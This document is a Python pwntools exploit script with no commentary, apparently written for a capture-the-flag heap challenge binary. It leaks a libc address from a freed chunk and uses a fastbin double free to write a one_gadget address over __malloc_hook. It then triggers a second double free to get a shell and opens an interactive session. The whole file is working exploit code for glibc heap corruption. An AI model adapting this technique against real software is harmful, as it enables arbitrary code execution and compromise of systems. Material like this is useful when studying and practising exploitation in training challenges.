from pwn import *
context.log_level='debug'

def cmd(c):
	p.sendlineafter(">>",str(c))
def add(size):
	cmd(1)
	p.sendlineafter(":",str(size))
def free(idx):
	cmd(4)
	p.sendlineafter("id:",str(idx))
def show(idx):
	cmd(2)
	p.sendlineafter("id:",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter("id:",str(idx))
	p.sendlineafter(":",c)
p=process("./chall")
libc=ELF("./chall").libc
add(0x88)#0
add(0x18)#1
free(0)
show(0)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7f11be8fcb78-0x7f11be538000)
add(0x88)#2

add(0x68)#3
add(0x68)#4
free(3)
free(4)
free(3)
add(0x68)
libc.address=base
edit(5,p64(libc.symbols['__malloc_hook']-35))
add(0x68)
add(0x68)
add(0x68)
one=0xf02a4
edit(8,'\x00'*19+p64(one+base))

free(1)
free(1)
log.warning(hex(base))
gdb.attach(p)
p.interactive()
